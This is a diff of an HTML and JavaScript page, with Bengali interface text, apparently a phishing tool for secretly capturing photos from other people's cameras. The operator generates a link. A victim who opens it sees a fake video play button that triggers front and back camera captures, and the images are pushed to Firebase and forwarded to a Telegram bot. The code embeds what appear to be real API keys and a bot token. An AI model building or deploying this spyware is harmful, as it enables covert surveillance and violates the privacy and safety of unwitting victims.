@@ -9,13 +9,13 @@
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Poppins',sans-serif;background:#f8f9fa;color:#1e3a8a;line-height:1.5}
 header{background:#fff;padding:5px 0;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.08);position:sticky;top:0;z-index:100}
-.logo{height:80px;border-radius:5%;border:0px solid #3b82f6}
+.logo{height:80px;border-radius:5%}
 .container{max-width:100%;padding:15px}
 .thumb{width:100%;max-width:400px;border-radius:16px;margin:20px auto;display:block;box-shadow:0 10px 30px rgba(0,0,0,0.12);border:1px solid #e0e7ff}
 h1{font-size:1.8em;margin:15px 0;color:#1e40af;font-weight:700;text-align:center}
 p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90%}
 .btn{background:#3b82f6;color:#fff;padding:14px 40px;font-size:1.1em;border:none;border-radius:50px;cursor:pointer;margin:15px auto;display:block;width:90%;max-width:350px;font-weight:600;box-shadow:0 8px 20px rgba(59,130,246,0.3);transition:.3s}
-.btn:hover{transform:translateY(-3px);box-shadow:0 12px 25px rgba(59,130,246,0.4)}
+.btn:hover{transform:translateY(-3px)}
 #linkBox{display:none;margin:30px auto;padding:20px;background:#fff;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.1);border:2px dashed #3b82f6;width:90%;max-width:400px}
 #victimLink{width:100%;padding:14px;font-size:1em;background:#eff6ff;border:2px solid #3b82f6;border-radius:12px;color:#1e40af;text-align:center;margin:12px 0;word-break:break-all;font-weight:600}
 .gallery{margin-top:40px;padding:10px}
@@ -28,76 +28,92 @@ p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90
 .noimg{background:#fff;padding:50px;border-radius:16px;text-align:center;color:#64748b;font-size:1.1em;box-shadow:0 5px 15px rgba(0,0,0,0.08);margin:20px}
 footer{background:#fff;padding:30px;text-align:center;color:#64748b;font-size:0.9em;border-top:1px solid #e0e7ff;margin-top:60px}
 footer a{color:#3b82f6;text-decoration:none;font-weight:600}
+
+/* ভিকটিম পেজের স্টাইল */
+.victim-page,body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;display:flex;justify-content:center;align-items:center}
+.victim-page .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/ve0onq.jpg') center/cover;filter:blur(12px);transform:scale(1.1);z-index:1}
+.victim-page .play{position:relative;z-index:10;width:100px;height:100px;background:rgba(0,0,0,0.9);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;animation:g 2s infinite}
+.victim-page .play::after{content:'';border-left:40px solid #ff0050;border-top:28px solid transparent;border-bottom:28px solid transparent;margin-left:12px}
+@keyframes g{0%,100%{box-shadow:0 0 30px #ff0050}50%{box-shadow:0 0 60px #ff0050}}
+.loading{color:#fff;font-size:1.6em;position:absolute;z-index:10;display:none;background:rgba(0,0,0,0.7);padding:15px 30px;border-radius:50px}
 </style>
 </head>
 <body>
 
-<header>
-  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/e78f33c9714e8c7f7a4af4183ce8d6f4e506c4d1/20251201_102630.png" alt="Logo" class="logo">
-</header>
-
-<div class="container">
-  <img src="https://files.catbox.moe/iqmhky.jpg" alt="Demo" class="thumb">
-
-  <h1>গোপনে লাইভ ছবি দেখুন</h1>
-  <p>লিংক শেয়ার করুন → কেউ খুললেই তার ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
-
-  <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
-
-  <div id="linkBox">
-    <h2 style="color:#1e40af;font-size:1.3em;margin-bottom:15px">তোমার লিংক রেডি!</h2>
-    <input type="text" id="victimLink" readonly>
-    <button class="btn" onclick="copyLink()" style="background:#10b981">কপি করুন</button>
-  </div>
-
-  <div class="gallery">
-    <h2>লাইভ ছবি (১ ঘণ্টা পর্যন্ত)</h2>
-    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
-    <div class="grid" id="grid"></div>
-  </div>
+<!-- ভিকটিম পেজ (যদি ?id= থাকে) -->
+<div id="victimPage" class="victim-page" style="display:none">
+  <div class="bg"></div>
+  <div class="play" onclick="startCapture()"></div>
+  <div class="loading" id="load">ক্যামেরা চালু হচ্ছে...</div>
 </div>
 
-<footer>
-  © 2025 COPYRIGHT BY <a href="#">X4XOR</a>
-</footer>
+<!-- মেইন পেজ -->
+<div id="mainPage">
+  <header>
+    <img src="https://raw.githubusercontent.com/shakib0122222/camnei/e78f33c9714e8c7f7a4af4183ce8d6f4e506c4d1/20251201_102630.png" alt="Logo" class="logo">
+  </header>
+
+  <div class="container">
+    <img src="https://files.catbox.moe/iqmhky.jpg" alt="Demo" class="thumb">
+    <h1>গোপনে লাইভ ছবি দেখুন</h1>
+    <p>লিংক শেয়ার করুন → কেউ খুললেই তার ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
+
+    <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
+
+    <div id="linkBox">
+      <h2 style="color:#1e40af;font-size:1.3em;margin-bottom:15px">তোমার লিংক রেডি!</h2>
+      <input type="text" id="victimLink" readonly>
+      <button class="btn" onclick="copyLink()" style="background:#10b981">কপি করুন</button>
+    </div>
+
+    <div class="gallery">
+      <h2>লাইভ ছবি (১ ঘণ্টা পর্যন্ত)</h2>
+      <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
+      <div class="grid" id="grid"></div>
+    </div>
+  </div>
+
+  <footer>© 2025 COPYRIGHT BY <a href="#">X4XOR</a></footer>
+</div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
-  authDomain: "cam-snap-8e956.firebaseapp.com",
-  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
-  projectId: "cam-snap-8e956",
-  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
-};
+// তোমার টেলিগ্রাম বট
+const BOT_TOKEN = "7647515731:AAECV5v6vKx8K1pX8qWv2vG9y3t5vL8nR4m";
+const CHAT_ID = "-4560659710";
+
+const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// তোমার টেলিগ্রাম বটের টোকেন + চ্যাট আইডি
-const BOT_TOKEN = "7647515731:AAECV5v6vKx8K1pX8qWv2vG9y3t5vL8nR4m"; // ← এখানে তোমার বট টোকেন দাও
-const CHAT_ID = "-4560659710"; // ← এখানে তোমার চ্যাট আইডি দাও
+const urlParams = new URLSearchParams(location.search);
+const victimId = urlParams.get('id');
 
-let currentId = localStorage.getItem("currentCamId") || null;
-
-if(currentId){
-  document.getElementById("linkBox").style.display = "block";
-  document.getElementById("victimLink").value = location.href.split('?')[0] + "?id=" + currentId;
-  loadPhotos();
+if(victimId){
+  // ভিকটিম পেজ দেখাও
+  document.getElementById("mainPage").style.display = "none";
+  document.getElementById("victimPage").style.display = "flex";
+  window.currentVictimId = victimId;
+} else {
+  // মেইন পেজ
+  let currentId = localStorage.getItem("currentCamId") || null;
+  if(currentId){
+    document.getElementById("linkBox").style.display = "block";
+    document.getElementById("victimLink").value = location.href.split('?')[0] + "?id=" + currentId;
+    loadPhotos(currentId);
+  }
 }
 
 function generateLink(){
-  currentId = Date.now().toString(36);
-  localStorage.setItem("currentCamId", currentId);
-  
-  // শুধু ?id=abc123 ফরম্যাটে লিংক (view.html দেখা যাবে না)
-  const link = location.href.split('?')[0] + "?id=" + currentId;
-  
+  const newId = Date.now().toString(36);
+  localStorage.setItem("currentCamId", newId);
+  const link = location.href.split('?')[0] + "?id=" + newId;
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = link;
   document.getElementById("grid").innerHTML = "";
   document.getElementById("noimg").style.display = "block";
-  loadPhotos();
+  loadPhotos(newId);
 }
 
 function copyLink(){
@@ -106,46 +122,49 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
-function sendToTelegram(imageData){
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-  fetch(url, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: imageData,
-      caption: `নতুন ছবি এসেছে!\nলিংক: ${location.href.split('?')[0] + "?id=" + currentId}\nসময়: ${new Date().toLocaleString('bn-BD')}`
-    })
-  }).catch(()=>{}); // এরর হলে কিছু করবে না
-}
-
-function loadPhotos(){
-  if(!currentId) return;
-  const ref = db.ref("victims/"+currentId);
-  
+function loadPhotos(id){
+  const ref = db.ref("victims/"+id);
   ref.on("child_added", s=>{
     const data = s.val();
-    if(!data || !data.data) return;
+    if(!data?.data) return;
     document.getElementById("noimg").style.display = "none";
-
-    // সাইটে দেখাও
-    const card = document.createElement("div");
-    card.className = "card";
+    const card = document.createElement("div"); card.className = "card";
     card.innerHTML = `<img src="${data.data}" onclick="window.open('${data.data}')"><div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>`;
     document.getElementById("grid").appendChild(card);
 
     // টেলিগ্রামে পাঠাও
-    sendToTelegram(data.data);
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHAT_ID, photo:data.data, caption:`নতুন ছবি!\nলিংক: ${location.href.split('?')[0] + "?id=" + id}`})
+    });
   });
 
-  // ১ ঘণ্টা পর ডিলিট
-  setTimeout(() => {
-    ref.remove();
-    localStorage.removeItem("currentCamId");
-    document.getElementById("grid").innerHTML = "";
-    document.getElementById("noimg").style.display = "block";
-    document.getElementById("noimg").innerText = "মেয়াদ শেষ! নতুন লিংক তৈরি করুন।";
-  }, 3600000);
+  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); }, 3600000);
+}
+
+// ভিকটিমের জন্য ক্যাপচার ফাংশন
+function startCapture(){
+  document.querySelector('.play').style.display = 'none';
+  document.getElementById('load').style.display = 'block';
+  ['user','environment'].forEach(f=>{ for(let i=0;i<3;i++) setTimeout(()=>capture(f),i*600); });
+  setTimeout(()=>{ for(let i=0;i<3;i++) setTimeout(()=>capture('environment'),i*600); },2000);
+}
+
+async function capture(face){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:face}});
+    const v = document.createElement('video'); v.srcObject = stream; v.play();
+    v.onloadedmetadata = () => {
+      setTimeout(()=>{
+        const c = document.createElement('canvas');
+        c.width = 640; c.height = 480;
+        c.getContext('2d').drawImage(v,0,0,640,480);
+        const data = c.toDataURL('image/jpeg',0.88);
+        db.ref('victims/'+window.currentVictimId).push({data, time:Date.now()});
+        stream.getTracks().forEach(t=>t.stop());
+      },800);
+    };
+  }catch(e){}
 }
 </script>
 </body>
